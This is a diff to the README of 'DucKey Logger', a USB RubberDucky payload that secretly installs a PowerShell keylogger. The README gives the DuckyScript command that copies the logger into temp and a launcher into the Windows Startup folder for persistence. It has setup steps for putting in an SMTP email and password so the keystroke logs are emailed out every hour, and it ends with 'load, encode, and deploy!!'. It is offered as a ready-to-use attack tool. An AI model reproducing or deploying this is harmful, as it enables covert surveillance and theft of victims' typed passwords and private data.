@@ -22,6 +22,8 @@ DucKey Logger is a USB RubberDucky payload that uses PowerShell to log keystroke
 - moves *c.cmd* file to windows startup directory
 - *c.cmd* will secretly run *p.ps1*
 - *p.ps1* will log keystrokes and email the logs every hour and startup [via SMTP]
+- *l.ps1* will email the logs every startup and every hour [via SMTP]
+    - sends logs hourly, regardless of system time
 
 ## Resources:
 - [YouTube Video](https://youtu.be/K0g0RHSUofw)
@@ -43,26 +45,13 @@ Set-Up/Installation
 $email = "example@gmail.com"
 $password = "password"
 ```
-2. change name of the SD Card in *payload.txt*
-```
-REM change 'L' to the name of your ducky
+2. in line 20 of *payload.txt*, change 'L' to the name of your ducky [SD Card]
+```powershell
 STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
 ```
-3. choose an option in *payload.txt*
-```
-REM comment out the option you decide NOT to use
-
-REM STAGE 4 [OPTION1]
-REM run keylogger
-STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit
-
-REM STAGE 4 [OPTION2]
-REM restart computer
-STRING shutdown /r
-```
-4. flash Twin-Duck firmware on to your duck
-    - [Tutorial](https://youtu.be/ao32BS8fwaM?t=700)
-5. load, encode, and deploy!!
+3. flash Twin-Duck firmware on to your duck
+    - [Tutorial](https://www.youtube.com/watch?v=BzYH-BPHLpE)
+4. load, encode, and deploy!!
 
 ## Extraneous:
 The *c.cmd* attack opportunity
